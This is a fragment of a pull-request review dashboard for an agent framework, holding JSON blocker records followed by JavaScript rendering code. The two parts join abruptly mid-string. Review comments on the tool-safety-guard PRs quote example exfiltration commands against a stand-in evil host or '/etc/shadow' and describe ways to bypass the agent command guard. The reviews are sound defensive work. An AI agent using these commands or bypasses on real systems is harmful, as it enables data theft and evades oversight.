event.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2034#discussion_r3517132747"}],"checks_fingerprint":"e3eb641ce9d595a86d39e36d","comments_fingerprint":"88b3eb5fa12e9c8c91102a36","head_ref":"submit/MMCG_session-multimodal-externalization","head_sha":"b5d1e619f4ba3c4dea96e81a157b47e715bf0d23","is_draft":false,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"b5d1e619f4ba3c4dea96e81a157b47e715bf0d23","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-07-03T02:55:29.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"b33142d275b5be743cab8688","number":2034,"planning_reasons":["head_sha_changed","checks_changed","review_threads_changed","comments_changed","mergeability_changed","updated_after_watermark"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"b2ffab590316be77b3be6f79","state":"OPEN","title":"{model, runner, internal/session}: add session multimodal externalization","updated_at":"2026-07-03T02:55:29.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2034"},"2037":{"author":"liuzengh","base_ref":"main","blockers":[{"kind":"draft_wip","summary":"Draft/WIP PR，本轮不做外部 review。","verification":"codecov/patch:fail"}],"checks_fingerprint":"5346ebddb9460659008dd9d6","comments_fingerprint":"de99169743de81e51900959f","head_ref":"feat/invoke-skill-observability","head_sha":"e21156d28a9379799d25870c2594df938c6d619b","is_draft":true,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"e21156d28a9379799d25870c2594df938c6d619b","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-06-30T06:43:50.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"702483eae88142ef06faaf2d","number":2037,"planning_reasons":["checks_changed","review_threads_changed","comments_changed","mergeability_changed"],"review_decision":"REVIEW_REQUIRED","review_threads_fingerprint":"806aa1136f59f8fe29570c20","state":"OPEN","title":"feat(telemetry): add invoke skill observability","updated_at":"2026-06-30T06:43:50.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2037"},"2041":{"author":"Rememorio","base_ref":"main","blockers":[{"kind":"human_review","line":0,"path":"evolution/approval_service.go","summary":"`approvalDecisionLocks` is process-local, but the real approval paths can run in different processes: the `openclaw evolution approve/reject` CLI and the runtime sweeper can both read `pending_approval` and then publish/write conflicting decisions. The serialization/CAS needs to live in the `CandidateStore` layer or a filesystem lock per revision, with status re-read under that lock and `ErrAlreadyDecided` returned before publishing if the status changed.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131847"},{"kind":"human_review","line":0,"path":"evolution/approval_service.go","summary":"Even within one process, this key serializes by revision, not by skill. Two pending revisions for the same skill can be promoted concurrently and race over the publisher, archive, and active pointer, which can leave the older revision active or archive a newer human-approved revision. Please serialize state-changing approval/rollback operations per `SkillID`, or make active-pointer updates transactional with revision status changes.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131851"},{"kind":"human_review","line":0,"path":"evolution/approval_service.go","summary":"Rollback still has a pointer/status consistency failure mode. If `pointer.Set` or `pointer.Clear` fails after `archiveActive` and writing the restored revision active, the previous active revision is already archived while the pointer can still reference it. Please either update pointer/status atomically or restore both current and target revision statuses on pointer failure, and add tests for `Set` and `Clear` failures.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131852"}],"checks_fingerprint":"2f2c7e0db594b3ed34402c87","comments_fingerprint":"2b131e217488c8b874cf49c3","head_ref":"evolution_rollback_autoexpire","head_sha":"cde8ca25dbf974fcf69f008adfbed17989ff4ee5","is_draft":false,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"cde8ca25dbf974fcf69f008adfbed17989ff4ee5","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-07-03T02:38:56.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"3890cd11bca09109dad9945d","number":2041,"planning_reasons":["checks_changed","review_threads_changed","comments_changed","mergeability_changed","updated_after_watermark"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"e5b1afc1edae464684f9539b","state":"OPEN","title":"{evolution, openclaw, docs}: add rollback API and pending_approval auto-expire","updated_at":"2026-07-03T02:38:56.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041"},"2044":{"author":"Nerdlet369","base_ref":"main","blockers":[{"kind":"human_review","line":0,"path":"tool/safety/guard.go","summary":"`NewGuard()` only extracts a `command` string, so `tool/codeexec` calls that carry code in `code_blocks` are scanned as empty input and allowed. This leaves one of the documented protected execution paths unguarded. Please JSON-unmarshal arguments into both `command` and `code_blocks`, populate `ScanInput.CodeBlocks`, and add Guard/WrapTool regressions for dangerous `code_blocks`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044#discussion_r3517129956"},{"kind":"human_review","line":0,"path":"tool/safety/rules.go","summary":"The policy-aware dangerous-command rule consumes `p.DeniedCommands`. The default/sample policy includes network clients like `curl`, so when users follow the recommended scanner wiring, `curl https://github.com/...` is denied by the dangerous-command rule before the network rule can apply `allowed_domains`. That makes the allowlist ineffective. Please keep network clients out of the dangerous-command deny list, split the policy fields by rule, or add scanner-level precedence tests covering both policy constructors.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044#discussion_r3517129961"},{"kind":"human_review","line":0,"path":"tool/safety/rules.go","summary":"Allowlist matching is substring-based over the whole command. `evilgithub.com` or `evil.com/?next=github.com` therefore matches an allowed `github.com` pattern and is downgraded to allow/review incorrectly. Please parse URL/host tokens and match exact hosts or valid subdomain suffixes only.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044#discussion_r3517129964"}],"checks_fingerprint":"13248cbf8c01661ecb5727ad","comments_fingerprint":"65bca2343475aa64b632ae11","head_ref":"feat/tool-safety-scanner-2002","head_sha":"15c37c497257e08dba613e8a33b3c6a9cce20ba6","is_draft":false,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"15c37c497257e08dba613e8a33b3c6a9cce20ba6","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-07-03T02:55:31.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"7daef12fe52cef1e45c0ba90","number":2044,"planning_reasons":["head_sha_changed","checks_changed","review_threads_changed","comments_changed","mergeability_changed","updated_after_watermark"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"7da19cb84638bc578f9ad432","state":"OPEN","title":"feat: Tool Safety Scanner with 8 rules and structured audit","updated_at":"2026-07-03T02:53:57.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2044"},"2045":{"author":"everfid-ever","base_ref":"main","blockers":[{"kind":"human_review","line":0,"path":"tool/safety/rules.go","summary":"This only fails closed for explicit `-K/--config`, but curl also reads the implicit default `.curlrc` unless `-q/--disable` is the first curl option. A whitelisted command such as `curl https://github.com/a` can still apply config-supplied `url`, `proxy`, or `resolve` entries and reach a non-whitelisted endpoint without triggering the network rule. Please fail closed/ask for curl unless config loading is disabled first, or otherwise prove the runtime clears curl config; add a regression with `HOME/.curlrc` defining an evil `url`/`resolve`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045#discussion_r3517129201"},{"kind":"human_review","line":0,"path":"tool/safety/rules.go","summary":"`--resolve github.com:443:2001:db8::1` is accepted by curl, but this helper splits on every colon and drops the unbracketed IPv6 address into non-host fragments. The scanner keeps only the allowlisted `github.com`, so the endpoint rewrite bypasses `R-NET-001`. Please parse `--resolve` with option-specific `host:port:addr[,addr]` logic that preserves the full address tail, including unbracketed IPv6 and `+host` forms, and add deny tests for both.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045#discussion_r3517129203"}],"checks_fingerprint":"74f1a9967d7e6b5a13d63741","comments_fingerprint":"b2a592c1f8ebddacb461f7f0","head_ref":"feat/tool_safety","head_sha":"47fbe0f9fa69762442167567276d22da09bfda7d","is_draft":false,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"47fbe0f9fa69762442167567276d22da09bfda7d","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-07-03T02:37:50.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"d749e387408b4509e318aeda","number":2045,"planning_reasons":["checks_changed","review_threads_changed","comments_changed","mergeability_changed","updated_after_watermark"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"3b24f46f1cea63979d22822b","state":"OPEN","title":"feat: add tool execution safety guard for secure command scanning and…","updated_at":"2026-07-03T02:37:50.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045"},"2047":{"author":"bytethm","base_ref":"main","blockers":[{"kind":"draft_wip","summary":"Draft/WIP PR，本轮不做外部 review。","verification":""}],"checks_fingerprint":"ddf8c5d39e754c8aa1a445f3","comments_fingerprint":"784a1be043b4d1082d55ba65","head_ref":"session-context-messages","head_sha":"600f034493ba36f6fc75cb093700755a29810cb9","is_draft":true,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"600f034493ba36f6fc75cb093700755a29810cb9","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-07-02T03:22:17.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"dfb5b4994f2f390845e8c61a","number":2047,"planning_reasons":["checks_changed","review_threads_changed","comments_changed","mergeability_changed"],"review_decision":"REVIEW_REQUIRED","review_threads_fingerprint":"b61a0b265b515316f230820b","state":"OPEN","title":"{agent, runner, examples}: add session context messages","updated_at":"2026-07-02T03:22:17.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2047"},"2049":{"author":"Spock12138","base_ref":"main","blockers":[{"kind":"human_review","line":0,"path":"test/replay_consistency_test.go","summary":"`concurrent_retry_writes` launches four successful `AddMemory` calls, including two independent duplicate-content writes, and only asserts that search returns at least two results. It does not inject a retry, an error, or a backend anomaly, so a backend that creates duplicate memory on retry would still pass while this PR claims to close #2001. Please add a real retry/anomaly case that proves the diff report catches duplicate retry effects, or explicitly scope retry/idempotency out of this PR and linked issue closure.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2049#discussion_r3517130918"}],"checks_fingerprint":"93b550cac74b0d65b268550b","comments_fingerprint":"d74b3b9f6eb9a99b0321f137","head_ref":"feat/replay-consistency-harness","head_sha":"b4f0555811d13e823615d1d5df1f5fedec10f916","is_draft":false,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"b4f0555811d13e823615d1d5df1f5fedec10f916","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-07-03T02:38:35.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"4569497678a47a1be6919d85","number":2049,"planning_reasons":["checks_changed","review_threads_changed","comments_changed","mergeability_changed","updated_after_watermark"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"5372067a924bfbe8e75247eb","state":"OPEN","title":"test: add replay consistency harness","updated_at":"2026-07-03T02:38:35.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2049"},"2050":{"author":"d2bz","base_ref":"main","blockers":[{"kind":"human_review","line":0,"path":"tool/safety/permission.go","summary":"The default mapping only recognizes raw `exec_command`, but tools coming from a normal `hostexec.NewToolSet` are wrapped by `NewNamedToolSet` and exposed as `hostexec_exec_command`. Those calls become `BackendUnknown` and return allow without scanning/audit, so the documented hostexec path can bypass the guard. Please include the prefixed hostexec names or derive the backend from the resolved semantic tool/toolset, and add a regression using `hostexec.NewToolSet` through `WithToolSets`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128454"},{"kind":"human_review","line":0,"path":"tool/safety/rules.go","summary":"The network rule extracts only the first target host, then allows the entire command when that host is allowlisted. `curl https://github.com/ok https://evil.example.com/exfil` therefore passes because only `github.com` is evaluated. Please extract and evaluate all network targets, denying/asking if any target is non-allowlisted or unknown.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128457"},{"kind":"human_review","line":0,"path":"tool/safety/rules.go","summary":"Denied-path scanning skips all flag tokens, so file operands embedded in options are missed: `@/etc/shadow`, `name=@/etc/shadow`, or `--output=/etc/shadow` never reach `matchesDeniedPath`. An allowlisted network command can therefore upload or overwrite sensitive paths, e.g. `curl --data-binary @/etc/shadow https://github.com/upload`. Please expand path candidates from option values and curl-style upload/file syntaxes before matching denied path patterns.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128459"}],"checks_fingerprint":"c776ee3c0f62d355462f0eba","comments_fingerprint":"a030cfcbaf17ee270ff38e95","head_ref":"feat/tool-safety-guard-issue-2002","head_sha":"a4f424f7621969e1aa736c3df5a567940a5ea3b1","is_draft":false,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"a4f424f7621969e1aa736c3df5a567940a5ea3b1","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-07-03T02:37:31.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"7a603b7b095b0bce6600c58a","number":2050,"planning_reasons":["checks_changed","review_threads_changed","comments_changed","mergeability_changed","updated_after_watermark"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"4d2c78f2b56f1042b099bc04","state":"OPEN","title":"feat(tool/safety): add tool execution safety guard","updated_at":"2026-07-03T02:37:31.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050"},"2051":{"author":"xiaosansh","base_ref":"main","blockers":[{"kind":"human_review","line":0,"path":"session/replaytest/cases.go","summary":"This case now creates a `FilterKey: \"branch\"` summary, but the events it summarizes still have empty `Event.FilterKey`. A backend can drop keyed event metadata and still pass this built-in case, so the previous filter-key coverage gap is only partially closed. Please set these c14 events to the same filter key and assert the keyed summary/session boundary reflects those keyed events.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2051#discussion_r3517127689"},{"kind":"human_review","line":0,"path":"session/replaytest/harness.go","summary":"Memory steps still silently no-op when `MemoryService` is nil. That means a custom or future replay case can forget `RequiredCaps.NeedsMemory` and still report success without running `AddMemoryStep` / `SearchMemoryStep`, the same false-pass class this PR fixed for track steps. Please return an execution error here (and in search) or derive/validate required capabilities from the step list before execution.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2051#discussion_r3517127691"}],"checks_fingerprint":"56d4d6e302cb115f9690e03e","comments_fingerprint":"2dbe5ac5300be5c7aaecd439","head_ref":"issue-2001-impl","head_sha":"63b9ec36e6c9ad00f53b46b53a57413f10256026","is_draft":false,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"63b9ec36e6c9ad00f53b46b53a57413f10256026","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-07-03T02:37:09.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"30698b21833c354792eef005","number":2051,"planning_reasons":["checks_changed","review_threads_changed","comments_changed","mergeability_changed","updated_after_watermark"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"298dbd93ffa996a3367b57a9","state":"OPEN","title":"session/replaytest: add multi-backend replay consi let lang = "zh";
let filter = "all";
const statusOrder = ["approved", "commented", "maintained", "merged", "skipped", "blocked"];

function text(value, fallback = "") {
  if (value === undefined || value === null || value === "") return fallback;
  if (typeof value === "object" && !Array.isArray(value)) {
    return value[lang] || value.zh || value.en || fallback;
  }
  return String(value);
}

function escapeHtml(value) {
  return text(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function formatRich(value) {
  let html = escapeHtml(value);
  const replacements = [
    [
      /(P[0-2]|codecov\/patch=FAILURE|go-apidiff=FAILURE|go-apidiff|FAILURE|失败|阻塞|不能合入|不能 merge|未合并|破坏性|breaking|unbounded|无界|绕过|丢失|重复|不稳定|风险)/gi,
      "mark-bad"
    ],
    [
      /(LGTM|已合并|已批准|squash merge|merged|approved|CI 全绿|全绿|修复有效|\bresolved\b|\bresolve\b)/gi,
      "mark-good"
    ],
    [
      /(pending|soft[- ]?CI|软门禁|follow-up|后续|关注|CodeRabbit|reviewability ledger|not_reached)/gi,
      "mark-info"
    ],
    [
      /(导出 API|\bAPI\b|兼容性|\bsession\b|\brunner\b|\bmemory\b|GraphRAG|workspace_exec|OpenAPI|\bpolicy\b|security|安全)/gi,
      "mark-warn"
    ]
  ];
  for (const [pattern, className] of replacements) {
    html = html.replace(pattern, `<mark class="${className}">$1</mark>`);
  }
  return html;
}

function prs() {
  const groups = reportData.skipped_groups || [];
  const skipped = groups.flatMap(group =>
    (group.items || []).map(item => ({
      ...item,
      status: item.status || "skipped",
      skip_reason: item.skip_reason || group.reason
    }))
  );
  return [
    ...(reportData.approved || []),
    ...(reportData.commented || []),
    ...(reportData.maintained || []),
    ...(reportData.blocked || []),
    ...skipped
  ];
}

function skippedGroups() {
  return reportData.skipped_groups || [];
}

function counts(items) {
  const result = Object.fromEntries(statusOrder.map(status => [status, 0]));
  for (const item of items) {
    const status = item.status || "skipped";
    result[status] = (result[status] || 0) + 1;
  }
  return result;
}

function setLanguage(nextLang) {
  lang = nextLang;
  document.documentElement.lang = nextLang === "zh" ? "zh-CN" : "en";
  document.querySelectorAll("[data-lang-button]").forEach(button => {
    button.classList.toggle("active", button.dataset.langButton === nextLang);
  });
  render();
}

function renderStatic() {
  document.querySelectorAll("[data-i18n]").forEach(node => {
    node.textContent = labels[lang][node.dataset.i18n];
  });
  const repo = reportData.repo || "trpc-group/trpc-agent-go";
  const generated = reportData.generated_at || "2026-07-03T03:03:02.953Z";
  document.getElementById("subtitle").textContent = labels[lang].subtitle
    .replace("{repo}", repo)
    .replace("{time}", generated);
  document.getElementById("search").placeholder = labels[lang].search;
  document.getElementById("openAll").textContent = labels[lang].expandAll;
  document.getElementById("closeAll").textContent = labels[lang].collapseAll;
  document.getElementById("footer").textContent = labels[lang].footer;
}

function renderMetrics(items) {
  const totalComments = items.reduce((sum, item) =>
    sum + ((item.inline_comments || []).length || item.comment_count || 0), 0);
  const followups = (reportData.follow_up || []).length;
  const reviewed = items.filter(item =>
    ["approved", "commented", "maintained", "merged", "blocked"].includes(item.status)
  ).length;
  const metricRows = [
    [labels[lang].total, items.length],
    [labels[lang].reviewed, reviewed],
    [labels[lang].approved, items.filter(item =>
      ["approved", "merged"].includes(item.status)).length],
    [labels[lang].comments, totalComments],
    [labels[lang].followups, followups]
  ];
  document.getElementById("metrics").innerHTML = metricRows.map(([label, value]) => `
    <div class="metric">
      <div class="value">${value}</div>
      <div class="label">${escapeHtml(label)}</div>
    </div>
  `).join("");
}

function renderBars(items) {
  const byStatus = counts(items);
  const maxCount = Math.max(1, ...Object.values(byStatus));
  document.getElementById("bars").innerHTML = statusOrder.map(status => {
    const value = byStatus[status] || 0;
    const width = Math.max(3, Math.round((value / maxCount) * 100));
    return `
      <div class="bar-row">
        <div class="bar-label">${labels[lang][status]}</div>
        <div class="bar-track"><div class="bar-fill ${status}" style="width:${width}%"></div></div>
        <strong>${value}</strong>
      </div>
    `;
  }).join("");
}

function renderTimeline() {
  const events = reportData.timeline || [];
  const container = document.getElementById("timeline");
  if (!events.length) {
    container.innerHTML = `<div class="empty">${labels[lang].empty}</div>`;
    return;
  }
  container.innerHTML = events.map(event => `
    <div class="timeline-item">
      <div class="time">${escapeHtml(event.time || "")}</div>
      <div>${escapeHtml(text(event.label || event.text || event))}</div>
    </div>
  `).join("");
}

function renderOverview() {
  const panel = document.getElementById("overviewPanel");
  const content = document.getElementById("overviewContent");
  const overview = reportData.overview || reportData.summary;
  const body = text(overview);
  if (!body) {
    panel.style.display = "none";
    content.textContent = "";
    return;
  }
  panel.style.display = "block";
  content.innerHTML = formatRich(body);
}

function renderChips() {
  const chipRows = ["all", ...statusOrder];
  document.getElementById("chips").innerHTML = chipRows.map(status => `
    <button type="button" class="chip ${filter === status ? "active" : ""}"
      data-filter="${status}">${labels[lang][status]}</button>
  `).join("");
  document.querySelectorAll("[data-filter]").forEach(button => {
    button.addEventListener("click", () => {
      filter = button.dataset.filter;
      renderCards();
      renderSkipGroups();
      renderFollowUp();
      renderChips();
    });
  });
}
